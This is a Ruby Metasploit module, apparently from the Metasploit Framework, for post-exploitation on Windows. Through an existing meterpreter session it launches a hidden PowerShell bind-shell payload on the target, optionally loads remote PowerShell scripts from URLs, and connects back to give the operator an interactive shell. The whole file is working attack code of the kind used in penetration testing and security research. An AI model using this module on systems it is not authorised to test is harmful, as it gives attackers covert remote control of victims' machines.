##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Local

  def initialize(info = {})
    super(update_info(info,
      'Name'                 => "Windows Local Interactive Powershell Session",
      'Description'          => %q(
        This module will start a new interactive PowerShell bind session. A list of
        modules (comma separated) can be supplied in the LOAD_MODULES option to import
        into the interactive session. E.g. http://site/p1.ps1,http://site/p2.ps1
        Use a meterpreter route to ensure you can gain access to the bind port.
      ),
      'License'              => MSF_LICENSE,
      'Platform'             => ['win'],
      'SessionTypes'         => ['meterpreter'],
      'DisclosureDate'       => 'Apr 15 2015',
      'Author'        =>
        [
          'Ben Turner', # benpturner
          'Dave Hardy' # davehardy20
        ],
      'References'    =>
        [
          ['URL', 'https://www.nettitude.co.uk/interactive-powershell-session-via-metasploit/']
        ],
      'Payload'        =>
        {
          'Compat' =>
          {
            'PayloadType'    => 'cmd_interact',
            'ConnectionType' => 'find'
          }
        },
      'Arch'          => [ ARCH_CMD ],
      'Targets'       =>
        [
          [ 'Windows', {} ]
        ],
      'DefaultTarget'  => 0
    ))

  end

  def exploit
    rhost = datastore['RHOST']
    lhost = datastore['LHOST']
    lport = datastore['LPORT']
    payload = datastore['PAYLOAD']

    # sysinfo is only on meterpreter sessions
    print_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?

    # Check that the payload is a Windows one and on the list
    if not  session.framework.payloads.keys.grep(/windows/).include?(datastore['PAYLOAD'])
      print_error("The Payload specified #{datastore['PAYLOAD']} is not a valid for this system")
      return
    end

    pay = client.framework.payloads.create(payload)
    pay.datastore['LHOST'] = lhost
    pay.datastore['LPORT'] = lport
    pay.datastore['RHOST'] = rhost
    
    raw = pay.generate
    res = session.sys.process.execute("#{raw}", nil, 'Hidden' => true, 'Channelized' => false)
    fail_with(Failure::Unknown,'Failed to start powershell process') unless res && res.pid
    computer_name = session.sys.config.sysinfo['Computer']
    vprint_status("Started PowerShell on #{computer_name} - PID: #{res.pid}")

    if datastore['LHOST'].to_s.empty?
      print_status("Attemping to connect to #{rhost}:#{lport}...")
      ctimeout = 10
      stime = Time.now.to_i
      last_error = nil

      while stime + ctimeout > Time.now.to_i
        Rex::ThreadSafe.sleep(2)
        begin
          client = Rex::Socket::Tcp.create(
            'PeerHost' => rhost,
            'PeerPort' => lport.to_i,
            'Proxies'  => datastore['Proxies'],
            'Context'  =>
              {
                'Msf'        => framework,
                'MsfPayload' => payload_instance,
                'MsfExploit' => self
              })
        rescue ::EOFError, Errno::ETIMEDOUT, Errno::ECONNRESET, Rex::ConnectionError, Rex::ConnectionTimeout, ::Timeout::Error => e
          last_error = e
        end

        if client
          handler(client)
          return
        end
      end
      print_warning("If a shell is unsuccesful, ensure you have access to the target host and port.")
      print_status("Try adding a route to the host: `route help`")
      if last_error
        raise last_error
      else
        fail_with(Failure::Unknown, "Unable to connect")
      end
    else
      print_status("Waiting for connection from #{rhost}:#{lport}...")
    end
  end
end
